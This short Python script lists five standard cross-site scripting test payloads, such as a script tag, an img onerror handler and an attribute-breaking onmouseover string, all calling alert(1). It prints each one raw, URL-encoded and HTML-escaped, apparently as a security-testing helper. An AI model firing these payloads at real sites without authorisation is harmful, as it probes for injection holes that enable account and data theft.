from urllib.parse import quote as url_encode
import html





XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "' onmouseover=alert(1) x='",
        ]   

def payloads_encoder():
    """
    Encodes the XSS payloads to be used in the application.
    """
    encoded_payloads = []
    for payload in XSS_PAYLOADS:
        encoded_payloads.append({
            "payload": payload,
            "url": url_encode(payload),
            "html": html.escape(payload)
        })
    return encoded_payloads

print(payloads_encoder())